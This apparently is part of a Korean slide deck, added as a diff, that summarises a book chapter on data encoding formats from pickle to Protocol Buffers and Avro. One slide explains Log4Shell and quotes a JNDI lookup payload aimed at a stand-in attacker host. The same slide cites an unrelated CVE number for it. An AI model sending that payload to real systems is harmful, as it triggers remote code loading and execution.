+<div class="note"><b>핵심</b> · 포인터는 "이 프로세스의 메모리 주소(0x7ff...)"를 가리키는데 이 주소는 다른 프로세스나 네트워크 영역 너머에는 아무 의미가 없음. 그래서 메모리 구조를 그대로 보낼 수 없고, <i>자기 완결적인(스스로 모든 정보를 담은)</i> 형태로 변환해야 함.</div>
+
+<h3>두 표현 사이의 번역(translation)</h3>
+<div class="cols">
+  <div class="card">
+    <span class="pill">인코딩</span>
+    <p><b>방향</b> · 메모리 표현 → 바이트 시퀀스</p>
+    <p class="mini">다른 이름: serialization, marshalling</p>
+  </div>
+  <div class="card">
+    <span class="pill t">디코딩</span>
+    <p><b>방향</b> · 바이트 시퀀스 → 메모리 표현</p>
+    <p class="mini">다른 이름: parsing, deserialization, unmarshalling</p>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>인코딩/디코딩이 불필요한 경우</h3>
+  <p>항상 인코딩/디코딩이 필요한 것은 아님.</p>
+  <ul>
+    <li><b>압축 데이터 직접 연산</b> · 데이터베이스가 디스크에서 로드한 압축 데이터에 직접 연산할 때</li>
+    <li><b>제로 카피(zero-copy) 데이터 형식</b> · 인코딩-디코딩 없이 그대로 사용하도록 설계된 형식 (ex. Cap'n Proto, FlatBuffers)</li>
+  </ul>
+  <p class="mini">하지만 대부분의 시스템들이 이런 변환을 필요로 하기 때문에 수많은 라이브러리와 인코딩 형식이 존재함.</p>
+</div>
+</div>`});
+
+/* ---- 5. 언어별 형식 ---- */
+slides.push({sec:"Formats", title:"언어별 형식", html:`
+<div class="kicker">1-1. Language-Specific Formats</div>
+<h1>언어별 내장 직렬화 — 편하지만 위험</h1>
+<div class="scroll">
+<p class="lead">많은 프로그래밍 언어는 인메모리 객체를 인코딩하는 <strong>내장 직렬화 기능</strong>을 제공함.</p>
+
+<div class="cols3">
+  <div class="card"><b>Java</b><p class="mini"><code>java.io.Serializable</code></p></div>
+  <div class="card"><b>Python</b><p class="mini"><code>pickle</code></p></div>
+  <div class="card"><b>Ruby</b><p class="mini"><code>Marshal</code></p></div>
+</div>
+<p class="mini">이 외 서드파티 라이브러리도 많음. ex) Java의 Kryo</p>
+
+<div class="card teal">
+  <h3>장점</h3>
+  <p>최소한의 추가 코드로 <strong>인메모리 객체</strong>를 처리할 수 있음.</p>
+</div>
+
+<h3>하지만 근본적인 문제가 있다</h3>
+<div class="cols">
+  <div class="card accent">
+    <h3>① 특정 언어에 묶임 (Language lock-in)</h3>
+    <ul>
+      <li>다른 언어로 그 데이터를 읽기 어려움</li>
+      <li>결과적으로 현재 프로그래밍 언어에 <strong>종속</strong>됨</li>
+      <li>다른 언어를 사용하는 시스템과 통합 불가</li>
+    </ul>
+  </div>
+  <div class="card accent">
+    <h3>② 보안 문제 (Security)</h3>
+    <p>같은 객체 타입으로 데이터를 복원하려면 디코딩 과정이 <strong>임의의 클래스를 인스턴스화</strong> 할 수 있어야 함. 이것이 보안 문제의 원천.</p>
+    <p class="mini">공격자가 임의의 클래스를 인스턴스화하게 만들 수 있고, 이것이 악용될 수 있음.</p>
+  </div>
+  <div class="card accent">
+    <h3>③ 버전 관리가 뒷전</h3>
+    <p>빠르고 쉬운 인코딩 처리가 목적이라, 상위/하위 호환성이라는 까다로운 문제를 소홀히 함.</p>
+  </div>
+  <div class="card accent">
+    <h3>④ 효율성도 뒷전</h3>
+    <p>인코딩/디코딩 CPU 시간, 인코딩된 구조의 크기. 특히 Java의 내장 직렬화가 성능과 크기 면에서 <strong>비효율적</strong>이라고 함.</p>
+  </div>
+</div>
+
+<div class="note"><b>결론</b> · 위와 같은 이유들 때문에 언어 내장 인코딩을 <i>일시적인(transient)</i> 목적 외에 사용하는 것은 좋은 생각이 아님. (일시적인 목적 = 잠깐 메모리에 임시로 캐싱하는 등의 휘발적 용도)</div>
+</div>`});
+
+/* ---- 6. Log4Shell ---- */
+slides.push({sec:"Formats", title:"Log4Shell 사례 — 임의 클래스 인스턴스화", html:`
+<div class="kicker">1-1. Security · CVE Case Study</div>
+<h1>Log4Shell — 보안 문제의 실제 사례</h1>
+<div class="scroll">
+<p class="lead">2021년 12월 발생한 <strong>Log4Shell 취약점</strong>도 공격자가 원하는 클래스를 인스턴스화하게 만든 게 핵심 원인이었음.</p>
+
+<div class="card accent">
+  <h3>① Log4j가 로그 문자열을 해석</h3>
+  <p>Log4j에는 로그 메시지 안의 특정 패턴을 치환해주는 <strong>"lookup" 기능</strong>이 있음. (<code>\${java:version}</code>을 로그에 찍으면 자바 버전 문자열로 바꿔주는 식)</p>
+  <p class="mini">공격자가 아이디 입력란이나 HTTP 헤더에 <code>\${jndi:ldap://attacker.com/x}</code> 라고 적어 넣으면 Log4j가 이 패턴의 해석을 시도함.</p>
+</div>
+
+<div class="card teal" style="margin-top:14px">
+  <h3>② JNDI가 외부 서버를 조회</h3>
+  <p><strong>JNDI</strong>(Java Naming and Directory Interface)는 자바가 이름으로 객체를 찾아오는 표준 API.</p>
+  <p class="mini"><code>ldap://attacker.com/x</code>를 만나면 Log4j는 JNDI를 통해 공격자가 통제하는 LDAP 서버에 "x라는 객체 정보 좀 줘"라고 요청.</p>
+</div>
+
+<div class="card gold" style="margin-top:14px">
+  <h3>③ 여기서 임의 클래스 인스턴스화가 발생</h3>
+  <p>당시 JNDI 구현은 이 응답을 받으면 그 원격 클래스 파일을 다운로드해서 로딩하고 <strong>인스턴스화</strong>하도록 동작.</p>
+  <p>객체를 만드는 과정(생성자나 초기화 블록)에 공격자가 심어둔 코드가 들어 있으면, 그게 서버에서 그대로 실행되었음.</p>
+</div>
+
+<div class="note"><b>교훈</b> · 디코딩이 임의 클래스를 만들 수 있는 자유를 갖는 순간, 그 자유는 공격면(attack surface)이 됨. <i>참고: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12384" target="_blank">CVE-2019-12384</a></i></div>
+</div>`});
+
+/* ---- 7. JSON, XML, CSV ---- */
+slides.push({sec:"Formats", title:"JSON, XML, CSV", html:`
+<div class="kicker">1-2. JSON, XML, and Binary Variants</div>
+<h1>표준 텍스트 형식 — 보편적이지만 흠이 많다</h1>
+<div class="scroll">
+<p class="lead">여러 프로그래밍 언어가 읽고 쓸 수 있는 표준 인코딩으로 가면, <strong>JSON과 XML</strong>이 명백한 후보임. CSV도 인기 있지만 중첩 없는 표 형태 데이터만 지원함.</p>
+
+<h3>텍스트 형식들의 문제점</h3>
+<div class="cols">
+  <div class="card accent">
+    <h3>① XML — 너무 장황하고 복잡</h3>
+    <p class="mini">XML은 너무 장확하고 복잡하다고 비판받음.</p>
+  </div>
+  <div class="card accent">
+    <h3>② 숫자 인코딩의 모호함</h3>
+    <ul>
+      <li><b>XML, CSV</b> · 우연히 숫자로만 이루어진 문자열을 구분할 수 없음(외부 스키마를 참조하지 않는 한)</li>
+      <li><b>JSON</b> · 문자열과 숫자는 구분. 하지만 정수와 부동소수점을 구분하지 않고, 정밀도를 명시하지 않음</li>
+    </ul>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>큰 수에서 문제 발생 — X(트위터) 사례</h3>
+  <ul>
+    <li><strong>2<sup>53</sup>보다 큰 정수</strong>는 JSON에서 정확하게 표현할 수 없음</li>
+    <li>JavaScript처럼 부동소수점을 쓰는 언어에서 파싱하면 이런 숫자가 부정확해짐</li>
+    <li>X(트위터)의 게시물 ID는 64비트 정수인데 JSON으로 인코딩하면 2<sup>53</sup> 초과로 부정확해짐 → <strong>한 번은 JSON 숫자로, 한 번은 십진 문자열로</strong> 두 번 인코딩</li>
+  </ul>
+</div>
+
+<div class="cols">
+  <div class="card accent">
+    <h3>③ 이진 문자열 미지원</h3>
+    <p>JSON과 XML은 이진 문자열(문자 인코딩 없는 바이트 시퀀스)을 지원하지 않음. 우회책으로 이진 데이터를 <strong>Base64</strong>로 텍스트 인코딩 — 다만 편법이고 데이터 크기가 조금 증가.</p>
+  </div>
+  <div class="card accent">
+    <h3>④ 스키마가 강력하지만 복잡</h3>
+    <p>XML과 JSON 스키마는 강력하지만 배우고 구현하기가 꽤 복잡함.</p>
+  </div>
+  <div class="card accent" style="grid-column:span 2">
+    <h3>⑤ CSV — 스키마 없음 + 모호함</h3>
+    <ul>
+      <li>스키마가 전혀 없음 — 각 행/열의 의미를 정의하는 건 애플리케이션의 몫</li>
+      <li>방식 자체가 모호 — 값에 쉼표나 개행문자가 있는 경우(공식 명세는 있어도 모든 파서가 올바르게 구현하지는 않음)</li>
+    </ul>
+  </div>
+</div>
+
+<div class="note"><b>그래도 충분히 좋다</b> · 모든 사람들이 이런 형식에 동의만 한다면, 모양이 얼마나 예쁘고 효율적이냐는 별로 중요하지 않음. <i>보통 어려운 것은 합의이기 때문임.</i></div>
+</div>`});
+
+/* ---- 8. JSON Schema ---- */
+slides.push({sec:"Formats", title:"JSON Schema", html:`
+<div class="kicker">1-2. JSON Schema</div>
+<h1>JSON Schema — 강력함의 대가</h1>
+<div class="scroll">
+<div class="card teal">
+  <h3>스키마란?</h3>
+  <p>데이터의 올바른 해석을 위해 <strong>"이 데이터가 올바른 구조인지"</strong> 검증하기 위한 규칙.</p>
+  <p class="mini">JSON Schema는 시스템 간 데이터 교환·저장 시 데이터를 모델링하는 방법으로 널리 채택됨. ex) 웹 서비스의 API 명세, 데이터베이스 등</p>
+</div>
+
+<h3>주요 기능</h3>
+<div class="cols">
+  <div class="card">
+    <b>표준 원시 타입 포함</b>
+    <p class="mini">string, number, integer, object, array, boolean, null</p>
+  </div>
+  <div class="card">
+    <b>별도의 검증 명세</b>
+    <p class="mini">필드에 제약 조건을 덧씌울 수 있음. ex) port 필드는 최솟값 1, 최댓값 65535로 제한</p>
+  </div>
+</div>
+
+<h3>개방형 vs 폐쇄형 콘텐츠 모델</h3>
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">Open</span>
+    <h4>개방형 (open content model)</h4>
+    <p>스키마에 정의되지 않은 필드가 허용됨 → <strong>상위 호환성 지원</strong> (옛 코드가 모르는 새 필드를 허용)</p>
+    <p class="mini">기본값이 개방형.</p>
+  </div>
+  <div class="r">
+    <span class="pill t">Closed</span>
+    <h4>폐쇄형 (closed content model)</h4>
+    <p>명시적으로 정의된 필드만 허용</p>
+    <p class="mini"><code>additionalProperties</code>를 false로 설정하면 폐쇄형.</p>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>개방형 모델의 복잡성 — 예) (정수 → 문자열) 맵</h3>
+  <p class="mini">JSON 객체의 키는 항상 문자열이므로 정수 key 맵 타입이 없어 불가능해 보임. 이를 해결하기 위해 다음과 같이 정의:</p>
+<pre><span class="c">{</span>
+  <span class="s">"\$schema"</span>: <span class="s">"http://json-schema.org/draft-07/schema#"</span>,
+  <span class="s">"type"</span>: <span class="s">"object"</span>,
+  <span class="s">"patternProperties"</span>: {
+    <span class="s">"^[0-9]+\$"</span>: { <span class="s">"type"</span>: <span class="s">"string"</span> }  <span class="c">// 숫자로만 이루어진 키</span>
+  },
+  <span class="s">"additionalProperties"</span>: <span class="k">false</span>  <span class="c">// 그 외 다른 필드 금지 → 폐쇄형</span>
+}</pre>
+</div>
+
+<div class="note"><b>강력함의 대가</b> · JSON Schema는 if/else 조건 로직, 명명된 타입(named types), 원격 스키마 참조 등을 지원하는 강력한 스키마 언어. 하지만 이런 기능들은 <i>다루기 힘든 정의</i>를 만든다 → <strong>상위/하위 호환 방식으로 스키마를 진화시키는 것이 어려워진다</strong>.</div>
+</div>`});
+
+/* ---- 9. Binary Encodings (intro) ---- */
+slides.push({sec:"Formats", title:"이진 인코딩 도입", html:`
+<div class="kicker">1-2. Binary Encodings</div>
+<h1>이진 인코딩 — 텍스트 형식의 공간 낭비를 줄이려는 시도</h1>
+<div class="scroll">
+<p class="lead">텍스트 형식(JSON, XML, CSV)은 이진 형식에 비하면 <strong>많은 공간</strong>을 차지함. 그래서 수많은 이진 인코딩이 개발됨.</p>
+
+<div class="cols">
+  <div class="card teal">
+    <h3>JSON 용</h3>
+    <p class="mini">MessagePack, CBOR, BSON, BJSON, UNJSON, BISON, Hessian, Smile, ...</p>
+  </div>
+  <div class="card teal">
+    <h3>XML 용</h3>
+    <p class="mini">Fast Infoset, ...</p>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>이런 이진 인코딩 형식들의 특징</h3>
+  <ul>
+    <li><strong>더 압축적</strong>이고 종종 파싱도 빠름</li>
+    <li>하지만 어떤 것도 텍스트 버전인 JSON/XML만큼 <strong>널리 채택되지는 않음</strong> (보편적 합의 면에서 텍스트 형식의 강점을 이기지 못함)</li>
+  </ul>
+</div>
+
+<div class="card accent">
+  <h3>이진 JSON의 결정적 한계 — 필드 이름</h3>
+  <p>여전히 인코딩된 데이터 안에 <strong>모든 객체 필드 이름을 포함</strong>해야 함.</p>
+<pre><span class="c">// 아래 JSON을 이진 인코딩 하더라도</span>
+<span class="c">// "userName", "favoriteNumber", "interests"라는</span>
+<span class="c">// 문자열을 어딘가에 그대로 담아야 함</span>
+{
+ <span class="s">"userName"</span>: <span class="s">"Martin"</span>,
+ <span class="s">"favoriteNumber"</span>: <span class="n">1337</span>,
+ <span class="s">"interests"</span>: [<span class="s">"daydreaming"</span>, <span class="s">"hacking"</span>]
+}</pre>
+</div>
+</div>`});
+
+/* ---- 10. MessagePack 예시 ---- */
+slides.push({sec:"Formats", title:"MessagePack 예시", html:`
+<div class="kicker">1-2. MessagePack — Binary JSON</div>
+<h1>MessagePack 인코딩 — 바이트 단위 해부</h1>
+<div class="scroll">
+<figure>
+  <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-2.png" alt="MessagePack 인코딩" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-2.png';">
+  <figcaption>그림 5-2 · MessagePack으로 인코딩된 JSON 레코드</figcaption>
+</figure>
+
+<div class="card teal">
+  <h3>각 바이트 및 의미</h3>
+  <ul>
+    <li><code>0x83</code> · 객체(0x80)이고 필드가 3개(0x03) 있다는 뜻</li>
+    <li><code>0xa8</code> · 문자열(0xa0)이고 길이가 8바이트(0x08) 라는 뜻</li>
+    <li>다음 8바이트 · 필드 이름 (<code>userName</code>)</li>
+    <li>다음 7바이트 · <code>0xa6</code> 접두사 + 필드값 (<code>Martin</code>)</li>
+    <li>...</li>
+  </ul>
+</div>
+
+<div class="card gold">
+  <h3>특징</h3>
+  <p>길이가 미리 표시되므로 <strong>문자열 끝을 알리는 마커, 이스케이프가 불필요</strong>.</p>
+</div>
+
+<div class="card accent">
+  <h3>결과 — 별로 안 줄었다</h3>
+  <ul>
+    <li>MessagePack 인코딩 = <strong>66바이트</strong></li>
+    <li>텍스트 JSON = <strong>81바이트</strong></li>
+  </ul>
+  <p>대부분의 JSON 이진 인코딩이 이와 비슷한 수준임.</p>
+  <p class="mini">이렇게 얻는 공간 이득 + 약간의 파싱 속도 보다 <strong>사람이 읽기 편한 방식의 이점이 더 크다</strong>.<br>(읽기 편함에서 오는 이점 > 공간 이득 + 파싱 속도 증가)</p>
+</div>
+
+<p class="mini">뒤에서 더 나은 인코딩들을 알아보자.</p>
+</div>`});
+
+
+/* ---- 11. Protocol Buffers 도입 ---- */
+slides.push({sec:"Formats", title:"Protocol Buffers", html:`
+<div class="kicker">1-3. Protocol Buffers</div>
+<h1>Protocol Buffers — 스키마 기반 이진 인코딩</h1>
+<div class="scroll">
+<div class="cols">
+  <div class="card teal">
+    <h3>Protocol Buffers (=protobuf) 란?</h3>
+    <ul>
+      <li><strong>Google</strong>이 개발한 이진 인코딩 라이브러리</li>
+      <li>Facebook이 개발한 <strong>Thrift</strong>와 유사</li>
+      <li><strong>스키마 기반</strong> 이진 인코딩</li>
+    </ul>
+  </div>
+  <div class="card accent">
+    <h3>스키마가 필수</h3>
+    <p>Protocol Buffers에서는 인코딩되는 모든 데이터에 <strong>스키마</strong>를 요구함.</p>
+    <p class="mini">앞에서 본 JSON을 인코딩하려고 하면, <b>인터페이스 정의 언어(IDL)</b>로 스키마를 작성해야 함.</p>
+  </div>
+</div>
+
+<pre><span class="k">syntax</span> = <span class="s">"proto3"</span>;
+<span class="k">message</span> Person {
+  <span class="k">string</span> user_name        = <span class="n">1</span>;
+  <span class="k">int64</span>  favorite_number  = <span class="n">2</span>;
+  <span class="k">repeated string</span> interests = <span class="n">3</span>;
+}</pre>
+
+<div class="card gold">
+  <h3>Protocol Buffers의 동작 흐름</h3>
+  <ol>
+    <li>코드 생성 도구가 위와 같은 스키마를 정의받고, <strong>여러 프로그래밍 언어로 스키마를 구현하는 클래스를 생성</strong></li>
+    <li>애플리케이션 코드가 이 클래스로 스키마를 따르는 레코드를 인코딩/디코딩</li>
+  </ol>
+  <p class="mini">JSON Schema보다 매우 단순함. (각 레코드의 필드와 타입만 정의함. 필드값에 대한 제약은 지원 안 함)</p>
+</div>
+
+<div class="card accent">
+  <h3>핵심 차이 — 필드 이름 대신 <span class="tag">필드 태그</span></h3>
+  <table>
+    <tr><th>형식</th><th>크기</th></tr>
+    <tr><td>텍스트 JSON</td><td><strong>81바이트</strong></td></tr>
+    <tr><td>MessagePack (이진 JSON)</td><td><strong>66바이트</strong></td></tr>
+    <tr><td>Protocol Buffers</td><td><strong>33바이트</strong></td></tr>
+  </table>
+</div>
+</div>`});
+
+/* ---- 12. ANIM 크기 비교 + Protobuf 인코딩 ---- */
+slides.push({sec:"Formats", title:"애니메이션 · 인코딩 크기 비교", anim:"sizebar", html:`
+<div class="kicker">Animation · Encoding Size Comparison</div>
+<h1>인코딩 형식별 바이트 크기</h1>
+<p class="lead" style="margin-bottom:6px">같은 JSON 데이터 — 인코딩 방식에 따라 크기가 어떻게 달라지는지 시각화함.</p>
+<div class="anim-stage">
+  <pre style="margin:0 0 10px"><span class="c">// 같은 데이터:</span>
+{ <span class="s">"userName"</span>: <span class="s">"Martin"</span>, <span class="s">"favoriteNumber"</span>: <span class="n">1337</span>, <span class="s">"interests"</span>: [<span class="s">"daydreaming"</span>, <span class="s">"hacking"</span>] }</pre>
+  <div id="sizeBars" style="margin-top:10px"></div>
+  <div class="anim-ctrl">
+    <button id="szPlay">▶ 막대 채우기</button>
+    <button id="szReset">↻ 리셋</button>
+    <span class="status" id="szStatus">시작하려면 버튼을 누르세요</span>
+  </div>
+</div>
+
+<figure style="margin-top:14px">
+  <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-3.png" alt="Protocol Buffers 인코딩" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-3.png';">
+  <figcaption>그림 5-3 · Protocol Buffers 인코딩 — 필드 이름 대신 태그 번호</figcaption>
+</figure>
+
+<div class="cols3">
+  <div class="card accent">
+    <h3>왜 이렇게 작아졌는가?</h3>
+    <p class="mini">필드 이름 대신 위 스키마에서 봤던 <strong>태그 번호</strong>를 사용함.</p>
+  </div>
+  <div class="card teal">
+    <h3>추가 공간 절약 기법</h3>
+    <ul>
+      <li>타입과 태그번호를 <strong>한 바이트에 packing</strong></li>
+      <li><strong>가변길이 정수</strong>(variable-length integer) · 작은 수에는 적은 바이트, 큰 수에는 더 많은 바이트 사용 (ex. 1337은 2바이트로 표현)</li>
+    </ul>
+  </div>
+  <div class="card gold">
+    <h3><code>repeated</code> 키워드</h3>
+    <p class="mini">필드가 단일 값이 아닌 값의 리스트임을 표시. 같은 필드 태그를 같은 레코드 안에서 <strong>반복 등장</strong>하는 것으로 표현함.</p>
+  </div>
+</div>
+`});
+
+/* ---- 13. Field tags & schema evolution ---- */
+slides.push({sec:"Formats", title:"필드 태그와 스키마 진화", html:`
+<div class="kicker">1-3. Field Tags &amp; Schema Evolution</div>
+<h1>필드 태그가 호환성의 열쇠</h1>
+<div class="scroll">
+<p class="lead">스키마는 시간이 지나면서 반드시 변한다 = <strong>스키마 진화(schema evolution)</strong>. 이때 양방향 호환성을 어떻게 유지할 수 있을까?</p>
+
+<div class="card teal">
+  <h3>예제에서 보았듯</h3>
+  <ul>
+    <li>인코딩된 레코드는 인코딩된 필드들을 <strong>단순 연결</strong>한 것</li>
+    <li>각 필드는 <strong>태그 번호</strong>로 식별되고, 데이터타입이 주석됨</li>
+    <li>값이 설정되지 않으면 인코딩에서 <strong>생략</strong>됨</li>
+  </ul>
+  <p>→ 필드 태그가 인코딩 데이터에서 <strong>가장 결정적</strong>임.</p>
+</div>
+
+<h3>필드 이름·태그 변경 가능성</h3>
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">불가능</span>
+    <h4>필드 태그 변경</h4>
+    <p>기존 모든 인코딩된 데이터가 무용지물이 됨.</p>
+  </div>
+  <div class="r">
+    <span class="pill t">가능</span>
+    <h4>필드 이름 변경</h4>
+    <p>인코딩 데이터는 필드 이름을 참조하지 않음.</p>
+  </div>
+</div>
+
+<div class="cols">
+  <div class="card accent">
+    <h3>새 필드 추가 (상위 호환성)</h3>
+    <ul>
+      <li>새 필드 추가 시 <strong>새 태그 번호</strong>를 부여함</li>
+      <li>옛 코드가 새 코드가 쓴 데이터를 읽을 때 → <strong>인식하지 못하는 태그 번호를 만나면 무시</strong></li>
+      <li>이렇게 무시할 때 <em>데이터타입 주석</em> 덕분에 몇 바이트를 건너뛸지 결정 가능 → 인식 못하는 필드를 보존하는 게 가능</li>
+      <li>결론적으로, <strong>상위 호환성 유지</strong></li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <h3>옛 데이터 읽기 (하위 호환성)</h3>
+    <ul>
+      <li>각 필드가 고유 태그 번호를 가지므로, 새 코드는 <strong>항상 옛 데이터를 읽을 수 있음</strong> (태그 번호가 항상 같은 의미)</li>
+      <li>옛 데이터를 읽을 때 새 스키마에 추가된 필드는 <strong>기본값</strong>으로 채워짐</li>
+      <li>결론적으로, <strong>하위 호환성 유지</strong></li>
+    </ul>
+  </div>
+</div>
+
+<div class="cols">
+  <div class="card gold">
+    <h3>필드 제거</h3>
+    <ul>
+      <li>제거한 태그 번호를 다시 쓰면 <strong>절대 안 됨</strong> (해당 태그 번호를 사용하는 데이터가 남아 있을 수 있음)</li>
+      <li>과거에 사용한 태그 번호를 스키마에 정의해 두어 <em>잊지 않을 수 있음</em></li>
+    </ul>
+  </div>
+  <div class="card accent">
+    <h3>데이터타입 변경</h3>
+    <p>일부 타입은 가능하지만 <strong>값이 잘릴 위험</strong>이 있음. ex) 32비트 정수 → 64비트 정수:</p>
+    <ul>
+      <li>새 코드에서는 옛 데이터를 읽기 쉬움</li>
+      <li>옛 코드에서는 새 데이터를 읽을 때 잘림 — 디코딩된 64비트 정수가 32비트에 안 들어가면 잘림</li>
+    </ul>
+  </div>
+</div>
+</div>`});
+
+/* ---- 14. ANIM: Protobuf schema evolution playground ---- */
+slides.push({sec:"Formats", title:"애니메이션 · Protobuf 스키마 진화", anim:"protoevo", html:`
+<div class="kicker">Animation · Protobuf Schema Evolution</div>
+<h1>스키마 진화 시뮬레이터 — 필드 태그의 마법</h1>
+<p class="lead" style="margin-bottom:6px">옛 스키마와 새 스키마를 나란히 두고 — 필드를 추가/삭제/이름변경 했을 때 호환성이 어떻게 유지되는지 직접 시도해보자.</p>
+<div class="anim-stage">
+  <div class="anim-ctrl" style="margin-top:0;margin-bottom:12px">
+    <button id="peAddSafe">＋ 새 필드 추가 (태그 4)</button>
+    <button id="peRename">✎ 필드 이름 변경</button>
+    <button id="peRemove">－ 옛 필드 제거 (태그 2)</button>
+    <button id="peReuseTag">⚠ 제거한 태그 2를 재사용</button>
+    <button id="peReset">↻ 리셋</button>
+  </div>
+  <div class="schema-edit">
+    <div class="schema-side">
+      <div class="h">옛 스키마 (writer가 사용)</div>
+      <div id="oldSchema"></div>
+    </div>
+    <div class="schema-side">
+      <div class="h">새 스키마 (reader가 사용)</div>
+      <div id="newSchema"></div>
+    </div>
+  </div>
+  <p class="mini" id="peMsg" style="margin-top:14px;min-height:60px;color:var(--accent2);font-family:'JetBrains Mono',monospace;line-height:1.7">버튼을 눌러 스키마를 진화시켜 보세요. 각 변경이 양방향 호환에 어떤 영향을 주는지 표시됨.</p>
+</div>
+<div class="cols3" style="margin-top:6px">
+  <div class="card teal"><span class="pill t">안전한 변경</span><p class="mini">새 태그로 필드 추가, 이름만 변경 — 인코딩 데이터에는 영향 없음.</p></div>
+  <div class="card gold"><span class="pill g">조심해야 함</span><p class="mini">필드 제거 시 그 태그를 영원히 봉인. 데이터타입 변경 시 잘림 위험.</p></div>
+  <div class="card accent"><span class="pill r">치명적</span><p class="mini">태그 번호 재사용은 옛 데이터를 잘못 해석하게 만듦.</p></div>
+</div>
+`});
+
+/* ---- 15. Avro 도입 ---- */
+slides.push({sec:"Formats", title:"Avro 도입", html:`
+<div class="kicker">1-4. Avro</div>
+<h1>Apache Avro — 태그 번호 없는 길</h1>
+<div class="scroll">
+<p class="lead">또 다른 이진 인코딩 형식인 <strong>Apache Avro</strong>. 2009년 Hadoop의 하위 프로젝트로 시작 — Protocol Buffers가 Hadoop의 사용 사례에 잘 맞지 않아서 만들어짐.</p>
+
+<div class="card teal">
+  <h3>두 가지 스키마 언어</h3>
+  <ul>
+    <li><strong>Avro IDL</strong> · 사람이 편집하기 위한 것</li>
+    <li><strong>JSON 기반</strong> · 기계가 더 쉽게 읽기 위한 것</li>
+  </ul>
+  <p class="mini">Protocol Buffers와 유사하게 필드와 타입만 명시함.</p>
+</div>
+
+<div class="cols">
+  <div>
+    <h3>Avro IDL 예시</h3>
+<pre><span class="k">record</span> Person {
+  <span class="k">string</span> userName;
+  <span class="k">union</span> { null, long } favoriteNumber = <span class="k">null</span>;
+  <span class="k">array</span> interests;
+}</pre>
+  </div>
+  <div>
+    <h3>동등한 JSON 표현</h3>
+<pre>{
+ <span class="s">"type"</span>: <span class="s">"record"</span>,
+ <span class="s">"name"</span>: <span class="s">"Person"</span>,
+ <span class="s">"fields"</span>: [
+  {<span class="s">"name"</span>:<span class="s">"userName"</span>,
+   <span class="s">"type"</span>:<span class="s">"string"</span>},
+  {<span class="s">"name"</span>:<span class="s">"favoriteNumber"</span>,
+   <span class="s">"type"</span>:[<span class="s">"null"</span>,<span class="s">"long"</span>],
+   <span class="s">"default"</span>:<span class="k">null</span>},
+  {<span class="s">"name"</span>:<span class="s">"interests"</span>,
+   <span class="s">"type"</span>:{<span class="s">"type"</span>:<span class="s">"array"</span>,
+   <span class="s">"items"</span>:<span class="s">"string"</span>}}
+ ]
+}</pre>
+  </div>
+</div>
+
+<div class="card accent">
+  <h3>결정적 차이 — 태그 번호가 없음</h3>
+  <p>Protocol Buffers와 달리, Avro는 <strong>필드 태그 번호가 없다</strong>.</p>
+  <p>처음 나왔던 JSON을 인코딩하면 → <strong>Avro: 32바이트</strong> (Protobuf 33바이트보다도 작음)</p>
+</div>
+</div>`});
+
+/* ---- 16. Avro 인코딩 원리 ---- */
+slides.push({sec:"Formats", title:"Avro 인코딩 원리", html:`
+<div class="kicker">1-4. Avro Encoding</div>
+<h1>Avro 인코딩 — 순수하게 값만</h1>
+<div class="scroll">
+<figure>
+  <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-4.png" alt="Avro 인코딩" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-4.png';">
+  <figcaption>그림 5-4 · Avro 인코딩 — 길이접두사+값의 연속</figcaption>
+</figure>
+
+<div class="card accent">
+  <h3>Avro에서는 필드나 데이터타입을 식별하는 것이 아무것도 없다</h3>
+  <p>그림과 같이 오직 <strong>길이접두사 + 값</strong>이 연결되어 있는 인코딩 방식임.</p>
+</div>
+
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">Protobuf</span>
+    <h4>Protocol Buffers</h4>
+    <p>각 필드에 <strong>타입 주석 + 태그 번호</strong> → 데이터 자체가 어느정도 <em>자기설명적</em>.</p>
+  </div>
+  <div class="r">
+    <span class="pill t">Avro</span>
+    <h4>Avro</h4>
+    <p><strong>순수하게 값만 나열</strong>. 어디서 한 필드가 끝나고 다음 필드가 시작하는지 데이터만 봐서는 알 수 없음.</p>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>핵심 — Avro는 스키마 없이 디코딩이 불가능</h3>
+  <p>이진 데이터를 파싱하기 위해 <strong>스키마에 나타나는 순서</strong>대로 필드를 훑으면서 스키마를 사용해 각 필드의 데이터타입을 판단함.</p>
+  <p>→ <strong>데이터를 읽는 코드가 데이터를 쓴 코드와 정확히 동일한 스키마를 사용할 때만</strong> 올바르게 디코딩할 수 있음.</p>
+</div>
+
+<div class="cols">
+  <div class="card teal">
+    <h3>장점</h3>
+    <p>태그, 타입 주석이 전혀 없어서 <strong>가장 압축적</strong>.</p>
+  </div>
+  <div class="card accent">
+    <h3>단점</h3>
+    <p>스키마가 조금만 어긋나도 <strong>데이터 전체가 깨짐</strong>.</p>
+  </div>
+</div>
+
+<p class="lead" style="margin-top:14px">결론적으로, 데이터를 읽는 코드와 스키마가 정확히 같아야 하는데 — 어떻게 <strong>스키마 진화(schema evolution)</strong>가 가능한가? 다음 슬라이드에서 살펴보자.</p>
+</div>`});
+
+/* ---- 17. Writer's vs Reader's schema ---- */
+slides.push({sec:"Formats", title:"Writer's vs Reader's 스키마", html:`
+<div class="kicker">1-4. Writer's &amp; Reader's Schema</div>
+<h1>Writer's Schema & Reader's Schema</h1>
+<div class="scroll">
+<p class="lead">Avro에는 <strong>두 개의 스키마 개념</strong>이 있음.</p>
+
+<div class="cols">
+  <div class="card teal">
+    <h3>① Writer's schema</h3>
+    <p>애플리케이션이 데이터를 <strong>인코딩할 때</strong> 사용하는 스키마.</p>
+  </div>
+  <div class="card teal">
+    <h3>② Reader's schema</h3>
